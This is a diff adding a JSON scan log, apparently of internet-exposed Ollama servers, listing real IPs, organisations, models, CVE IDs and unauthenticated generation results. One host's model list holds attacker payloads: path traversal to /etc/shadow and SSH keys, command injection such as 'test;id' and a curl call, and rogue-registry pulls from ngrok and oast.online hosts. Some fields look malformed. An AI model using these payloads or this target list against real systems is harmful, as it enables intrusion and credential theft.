@@ -1,0 +1,4539 @@
+[
+  {
+    "url": "http://140.115.54.62:11434",
+    "accessible": false,
+    "auth_required": true,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "401 Unauthorized",
+    "org": "Ministry of Education Computer Center",
+    "country": "Taiwan",
+    "city": "Taoyuan City",
+    "hostnames": [
+      "widm-eda.csie.ncu.edu.tw"
+    ]
+  },
+  {
+    "url": "http://116.142.76.131:11434",
+    "accessible": false,
+    "auth_required": true,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "401 Unauthorized",
+    "org": "China United Network Communications Corporation Limited",
+    "country": "China",
+    "city": "Shanghai",
+    "hostnames": [
+      "131.76.142.116.adsl-pool.jlccptt.net.cn"
+    ]
+  },
+  {
+    "url": "http://66.240.205.176:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "gemma3:8.2b",
+        "size_bytes": 5103779579,
+        "size_mb": 4867,
+        "params": "8.2B",
+        "quantization": "Q5_K_M",
+        "family": "gemma"
+      },
+      {
+        "name": "deepseek-r1:14b",
+        "size_bytes": 8903266873,
+        "size_mb": 8491,
+        "params": "14B",
+        "quantization": "Q5_K_M",
+        "family": "deepseek"
+      },
+      {
+        "name": "qwen2.5:72b",
+        "size_bytes": 38003343656,
+        "size_mb": 36243,
+        "params": "72B",
+        "quantization": "Q5_K_M",
+        "family": "qwen"
+      },
+      {
+        "name": "deepseek-r1:latest",
+        "size_bytes": 18702223791,
+        "size_mb": 17836,
+        "params": "33B",
+        "quantization": "Q8_0",
+        "family": "deepseek"
+      }
+    ],
+    "version": "0.1.46",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "CARI.net",
+    "country": "United States",
+    "city": "San Diego",
+    "hostnames": []
+  },
+  {
+    "url": "http://172.233.44.98:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "llama3.1:8b",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "qwen2.5-coder:7b",
+        "size_bytes": 4724391168,
+        "size_mb": 4506,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "qwen2"
+      },
+      {
+        "name": "llama2:13b",
+        "size_bytes": 7366082560,
+        "size_mb": 7025,
+        "params": "13b",
+        "quantization": "Q4_0",
+        "family": "llama"
+      },
+      {
+        "name": "llama3:70b",
+        "size_bytes": 42254124011,
+        "size_mb": 40297,
+        "params": "70b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "gemma4:26b-mlx",
+        "size_bytes": 16458916512,
+        "size_mb": 15696,
+        "params": "26b",
+        "quantization": "Q4_K_M",
+        "family": "gemma"
+      },
+      {
+        "name": "qwen3.6:27b",
+        "size_bytes": 17189165120,
+        "size_mb": 16393,
+        "params": "27b",
+        "quantization": "Q4_K_M",
+        "family": "qwen"
+      },
+      {
+        "name": "qwen3.6:35b-mlx",
+        "size_bytes": 22558916512,
+        "size_mb": 21514,
+        "params": "35b",
+        "quantization": "Q4_K_M",
+        "family": "qwen"
+      },
+      {
+        "name": "llama3.2:1b",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../opt/ollama/data/credentials.txt",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../opt/ollama/data/.env_backup",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../opt/ollama/data/target_recon.json",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../opt/ollama/data/db_dump.sql",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../opt/ollama/data/run_exploit.sh",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../opt/ollama/data/exploits/ssrf_probe.sh",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak__etc_passwd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak__etc_hostname",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../etc/passwd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "f5leak__etc_shadow",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "f5leak__root_.ssh_id_ed25519",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "f5leak__root_.ssh_id_rsa",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "f5leak__home_all_.ssh_id_ed25519",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "f5leak__etc_ssh_ssh_host_ed25519_key",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "f5leak__opt_ollama_data_credentials.t",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "f5leak__opt_ollama_data_.env_backup",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "raw_creds_1782214923913",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "f5leak__opt_ollama_data_target_recon.",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "raw_env_backup_1782214951627",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "f5leak__opt_ollama_data_db_dump.sql",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "raw_targets_1782214980064",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "rawleak__etc_passwd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "raw_dbdump_1782215007751",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "rawleak__etc_shadow",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "raw_exploit_1782215034911",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "raw_ssrf_1782215060783",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "raw_passwd_1782215087141",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "raw_shadow_1782215115515",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "raw_hostname_1782215142666",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test;id",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test$(id)",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test$(whoami)",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://d8tr5qc9f2eh23r8qtg0z7uraxzxxpzgn.oast.online/rogue/3fzzlbmtrpkzuxtakvnbgvbyeza",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "file:///opt/ollama/data/credentials.txt",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "exfil",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../etc/passwd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../etc/shadow",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../root/.bash_history",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../home/*/.ssh/id_rsa",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../../../etc/passwd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../../../../etc/passwd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../../../../etc/shadow",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../../../../root/.ssh/id_rsa",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../../../../root/.ssh/authorized_keys",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../root/.ssh/id_rsa",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read__proc_self_environ",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test;curl -s http://ifconfig.me;id",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "\"",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_read1",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test_read2",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "http://127.0.0.1:8080/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "fileread_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "readfile1",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "r1",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "r2",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "r3",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "read__root__ssh_id_rsa",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "x__etc_passwd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "x__etc_hostname",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "x__root_.ssh_id_rsa",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../tmp/testpull",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "192.168.1.1:8888/test/model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "testzip",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "routetest",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "8eeb-118-136-159-164.ngrok-free.app/rogue/exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "87c5-118-136-159-164.ngrok-free.app/rogue/exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "87c5-118-136-159-164.ngrok-free.app/zipx1782662000/exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "87c5-118-136-159-164.ngrok-free.app/debugtest123/exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "87c5-118-136-159-164.ngrok-free.app/test1782662103/exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "87c5-118-136-159-164.ngrok-free.app/z2662211/exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "blobtest",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "blobtest2",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "blobtest3",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "digesttest",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "nonexistent-registry.example.com:9999/test/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ziptest_a",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ziptest_b",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ziptest_c",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "87c5-118-136-159-164.ngrok-free.app/v700583/exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "a0fa-182-253-127-165.ngrok-free.app/z700696/exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "pulldigesttest",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "empty_local",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "template_only",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "nonexistent_abc123xyz",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "87c5-118-136-159-164.ngrok-free.app/testinsec/exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "87c5-118-136-159-164.ngrok-free.app/testinsec2/exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "this-registry-definitely-doesnt-exist-xyzzy.com/library/test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ollama.anomaly.software/test123/model",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "hydrateam/hydrav1",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "huihui_ai/qwen3.5-abliterated:2b",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "qwen"
+      },
+      {
+        "name": "tinyllama:latest",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "hacked_by_pentest",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "rce_test_pentest",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "env_leak",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "cfg_leak",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssh_inject",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ssh_key_leak",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_c77709b307e332dffc76ba89637bcf25",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_72d687161e8255cb2cbc5982993c2757",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_4d46f8b5f3665f77d94620adb5e0900d",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_b14e86e8b3f43f5754a2652124475100",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_507a20c6e5704407b13c91e95005d6dd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_1cf04e4dc2ce0a6f0a09787072d8071e",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_22fc5567a1d0bdcbf2d156ba2c2d7f60",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_5123a704fb1a9c1c63c2f945085238b6",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_kh_1782723306",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_bh_1782723316",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "environ_1782723387",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "cfg_1782723402",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "rce_registry_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ak_1782723496",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_5976111503904111693",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_2242294216482835741",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_3804937153866202468",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "leak_7073818958363006286",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "23.254.233.159:8088/rogue/exploit",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "buf_overflow_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "inj_1782726222831223000",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "inj_1782726232860888000",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "inj_1782726242882117000",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "proc_self_maps",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "proc_self_cmd",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ollama_key_e433dc00",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ollama_key_494b7c2c",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "ollama_key_a25f5ea8",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "pubkey_test",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../opt/ollama/data/credentials.txt",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "hydrateam/hydrab22",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../../../root/.ssh/id_rsa",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../../../etc/shadow",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../credentials.txt",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../.env",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "glm-5.2:cloud",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "hydrateam/hydrab23",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "readtest1",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "rcetest",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "../../../../etc/hostname",
+        "size_bytes": 4108916512,
+        "size_mb": 3919,
+        "params": "7b",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
